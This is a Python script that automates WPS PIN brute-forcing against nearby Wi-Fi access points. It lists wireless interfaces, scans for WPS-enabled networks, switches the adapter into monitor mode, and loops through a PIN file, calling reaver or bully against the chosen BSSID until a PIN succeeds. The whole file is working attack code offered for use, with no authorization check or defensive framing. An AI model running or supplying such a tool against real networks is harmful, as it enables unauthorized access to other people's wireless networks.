#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
from pathlib import Path

# ANSI colors
GREEN = "\033[92m"
BLUE  = "\033[94m"
YELLOW= "\033[93m"
RED   = "\033[91m"
RESET = "\033[0m"

PIN_FILE_DEFAULT = "/sniffixx/wps_pins.txt"
REAVER_TIMEOUT_SECONDS = 10
BULLY_TIMEOUT_SECONDS = 10

def ensure_root():
    if os.geteuid() != 0:
        print("⚠️  Please run as root (or via sudo).")
        sys.exit(1)

def list_interfaces():
    out = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=False).stdout.splitlines()
    return [line.split()[1] for line in out if line.strip().startswith("Interface")]

def choose_interface():
    ifaces = list_interfaces()
    if not ifaces:
        print("❌ No wireless interfaces found.")
        sys.exit(1)
    print("Available wireless interfaces:")
    for i, ifc in enumerate(ifaces, 1):
        print(f"  {i}) {ifc}")
    sel = input("Select interface number: ").strip()
    try:
        return ifaces[int(sel)-1]
    except Exception:
        print("Invalid choice."); sys.exit(1)

def enable_monitor(adapter):
    """
    Flip the interface into monitor mode using iw.
    """
    subprocess.run(["ip", "link", "set", adapter, "down"], check=False)
    subprocess.run(["iw", adapter, "set", "monitor", "none"], check=False)
    subprocess.run(["ip", "link", "set", adapter, "up"], check=False)
    print(f"✅ Interface {adapter} set to monitor mode.")
    return adapter

def scan_wps_networks(iface):
    """
    Use iw dev <iface> scan and filter only WPS-enabled APs.
    """
    proc = subprocess.run(["iw", "dev", iface, "scan"],
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          text=True, check=False)
    lines = proc.stdout.splitlines()
    networks = []
    current = None
    for line in lines:
        line = line.strip()
        if line.startswith("BSS "):
            bssid = line.split()[1].upper()
            current = {"bssid": bssid, "ssid": "", "wps": False}
            networks.append(current)
        elif current is not None:
            if line.startswith("SSID: "):
                current["ssid"] = line.split("SSID: ", 1)[1]
            elif line.startswith("WPS:"):
                current["wps"] = True
            # ignore WPS detail lines like "Model:", "Config methods:", etc.
    # Only return WPS-enabled networks
    return [n for n in networks if n.get("wps")]

def pick_network(nets):
    while True:
        print("\nAvailable WPS networks:")
        for i, n in enumerate(nets, 1):
            print(f"  {i}) {n['ssid']} ({n['bssid']})")
        sel = input("\nChoose network number (Enter to rescan): ").strip()
        if not sel:
            return None
        if sel.isdigit():
            i = int(sel)
            if 1 <= i <= len(nets):
                return nets[i-1]
        print("Invalid selection.")

def run_reaver_pin(adapter, bssid, pin, timeout_sec=REAVER_TIMEOUT_SECONDS):
    cmd = ["reaver", "-i", adapter, "-b", bssid, "-p", pin, "-vv"]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec)
        text = (out.stdout or "") + (out.stderr or "")
        success = ("WPS transaction completed successfully" in text) or ("WPS PIN found" in text)
        return success, text
    except subprocess.TimeoutExpired:
        return False, "[timeout]"

def run_bully_pin(adapter, bssid, pin, timeout_sec=BULLY_TIMEOUT_SECONDS):
    cmd = ["bully", adapter, "-b", bssid, "-p", pin, "-v", "3"]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec)
        text = (out.stdout or "") + (out.stderr or "")
        success = ("PIN found" in text) or ("WPS PIN" in text)
        return success, text
    except subprocess.TimeoutExpired:
        return False, "[timeout]"

def brute_force_loop(adapter, bssid, pin_file, tool="reaver", timeout_sec=REAVER_TIMEOUT_SECONDS):
    if not Path(pin_file).is_file():
        print(f"{RED}❌ PIN file not found: {pin_file}{RESET}")
        return
    print(f"{BLUE}Starting WPS brute-force with {tool}…{RESET}")
    with open(pin_file, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            pin = line.strip()
            if not pin:
                continue
            print(f"Trying PIN: {pin}")
            if tool == "reaver":
                ok, out = run_reaver_pin(adapter, bssid, pin, timeout_sec)
            else:
                ok, out = run_bully_pin(adapter, bssid, pin, timeout_sec)
            if ok:
                print(f"{GREEN}Success! Correct PIN found: {pin}{RESET}")
                print("Stopping attack…")
                return
            else:
                print(f"PIN {pin} failed, moving to next…")
    print(f"{YELLOW}Completed list without success.{RESET}")

def main():
    ensure_root()
    adapter = choose_interface()

    # Step 1: Scan in managed mode
    while True:
        print(f"\n{YELLOW}Scanning for WPS-enabled networks on {adapter}…{RESET}")
        nets = scan_wps_networks(adapter)
        if not nets:
            print(f"{RED}No WPS-enabled networks found, retrying…{RESET}")
            time.sleep(2)
            continue
        sel = pick_network(nets)
        if sel:
            break

    bssid = sel["bssid"]
    ssid  = sel["ssid"]
    print(f"\n{GREEN}Selected BSSID:{RESET} {bssid}")
    print(f"{GREEN}Selected ESSID:{RESET} {ssid}")

    # Step 2: Flip into monitor mode only after target chosen
    adapter = enable_monitor(adapter)

    pin_file = input(f"\nPIN file path [{PIN_FILE_DEFAULT}]: ").strip() or PIN_FILE_DEFAULT
    tool = ""
    while tool not in ("reaver", "bully"):
        tool = input("Choose tool (reaver/bully): ").strip().lower()
    timeout = REAVER_TIMEOUT_SECONDS if tool == "reaver" else BULLY_TIMEOUT_SECONDS
    try:
        t_in = input(f"Per-PIN timeout seconds [{timeout}]: ").strip()
        if t_in:
            timeout = int(t_in)
    except Exception:
        pass
    brute_force_loop(adapter, bssid, pin_file, tool=tool, timeout_sec=timeout)

if __name__ == "__main__":
    main()